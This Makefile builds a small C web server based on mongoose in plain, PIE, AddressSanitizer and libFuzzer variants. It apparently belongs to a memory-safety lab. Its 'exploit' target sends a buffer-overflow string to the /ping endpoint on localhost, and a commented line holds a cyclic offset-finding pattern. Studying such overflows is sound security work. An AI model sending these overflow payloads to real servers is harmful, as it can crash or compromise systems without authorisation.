files_all = webserver.c http.c mongoose.c 
files_short = http.c mongoose.c
outfile = webserver


webserver: $(files_all)
	gcc -g -fno-pie webserver.c mongoose.c http.c -o $(outfile)


webserver-pie: $(files_all)
	gcc -g -fpie webserver.c mongoose.c http.c -o $(outfile).pie


webserver-sanitizer: $(files_all)
	clang -g -fsanitize=address mongoose.c http.c webserver.c  -o $(outfile).sanitizer


fuzzer: $(files_short)
	clang -g -fsanitize=address,fuzzer mongoose.c http.c -o $(outfile).libfuzzer


exploit:
	curl localhost:8000/login --output -
	curl localhost:8000/logout
	curl localhost:8000/ping?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbcccccccc
	#curl localhost:8000/ping?Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7
	curl localhost:8000/logout


clean:
	rm webserver
	rm webserver.pie
	rm webserver.sanitizer
	rm webserver.libfuzzer
